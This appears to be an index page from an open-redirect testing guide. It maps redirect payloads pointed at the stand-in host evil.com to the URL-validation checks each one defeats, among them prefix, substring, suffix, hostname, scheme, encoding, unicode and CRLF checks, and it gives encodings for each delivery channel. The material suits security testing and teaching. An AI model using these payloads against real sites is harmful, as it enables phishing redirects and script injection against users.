# Payload map — the arm → the filter → the Location navigation

## The arm → the filter-boundary map

| The arm | The boundary it crosses | The file |
|---|---|---|
| `https://evil.com` | none — the baseline | `payload-dictionary.md` |
| `//evil.com` | the `startswith('/')` | `per-check.md`, `per-vector.md` |
| `/\evil.com` | the `\`->`/` normalize | `per-check.md`, `parser-differentials.md` |
| `\\evil.com` | the `\\`->`//` normalize | `per-vector.md` |
| `/%5cevil.com` | the encoded `\` | `encoding-attacks.md` |
| `https://t.com@evil.com` | the userinfo `@` | `per-check.md`, `parser-differentials.md` |
| `evil.com\@target.com` | the `\@` parse-gap | `parser-differentials.md` |
| `https://evil.com%40target.com` | the encoded `@` | `encoding-attacks.md` |
| `https://t.com.evil.com` | the suffix boundary | `per-target.md`, `per-check.md` |
| `eviltarget.com` | the no-boundary contains | `per-target.md` |
| `https://evil.com/t.com` | the substring-in-path | `per-check.md` |
| `https:evil.com` | the scheme-no-// | `per-vector.md` |
| `https%3a%2f%2fevil.com` | the decode-order | `encoding-attacks.md` |
| `https%253a%252f%252fevil.com` | the double-decode | `encoding-attacks.md` |
| `javascript:alert(1)` | the scheme-check | `per-vector.md`, `client-side.md` |
| `data:text/html,...` | the scheme-check | `per-vector.md` |
| `https:%ef%bc%8f%ef%bc%8fevil.com` | the unicode/ASCII check | `encoding-attacks.md` |
| `%20https://evil.com` | the whitespace/trim check | `encoding-attacks.md` |
| `%0d%0ahttps://evil.com` | the CRLF-split | `edge-cases.md`, `per-route.md` |

## The filter → the arm map

| The filter | The defeating arm | The file |
|---|---|---|
| `startswith('/')` | `//evil.com`, `/\evil.com`, `\\evil.com`, `/%5cevil.com` | `per-check.md` |
| `startswith('/') && !//` | `/\evil.com`, `/%5cevil.com`, `/\/evil.com` | `per-check.md` |
| `contains('t.com')` | `evil.com/t.com`, `evil.com?t.com`, `evil.com#t.com`, `t.com.evil.com`, `eviltarget.com` | `per-check.md`, `per-target.md` |
| `endswith('t.com')` (string) | `evil.com/t.com`, `eviltarget.com` | `per-check.md` |
| `endswith('t.com')` (host) | `eviltarget.com`, `x.target.com` (subdomain) | `per-target.md` |
| `hostname == 't.com'` | `evil.com\@target.com`, `t.com.`, the `@`-parse-gap | `parser-differentials.md` |
| `netloc == 't.com'` | the userinfo/port/dot arms | `per-check.md` |
| `scheme in [http,https]` | `https:evil.com`, `javascript:`, `data:` | `per-vector.md` |
| `no '://'` | `//evil.com`, `\\evil.com`, `/\evil.com` | `per-check.md` |
| the regex | `x.target.com@evil.com`, `t.com\@evil.com` | `per-check.md` |
| `host in allowed` | `evil.com\@target.com`, `t.com.`, the encoded-host | `per-target.md` |
| the encoded-check | the decoded-form arms | `encoding-attacks.md` |
| the raw-check | the encoded-form arms | `encoding-attacks.md` |
| the ASCII-check | the unicode/fullwidth arms | `encoding-attacks.md` |
| the whitespace-strip | the whitespace/control arms | `encoding-attacks.md` |

## The carrier → the arm-encoding map

| The carrier | The arm-encoding |
|---|---|
| a GET query | `urllib.parse.quote(arm)` |
| a POST body | `urllib.parse.quote(arm)` in the body |
| a path segment | `urllib.parse.quote(arm, safe='')` |
| a Referer | the raw arm |
| a cookie | the raw arm |
| a session set | `urllib.parse.quote(arm)` on the set-endpoint |
| a fragment | the raw arm (the JS reads it) |
| a localStorage | the raw arm (the JS reads it) |

## The map-record

`map: <the-arm> -> <the-boundary> -> <the-filter> -> <the-verdict>`
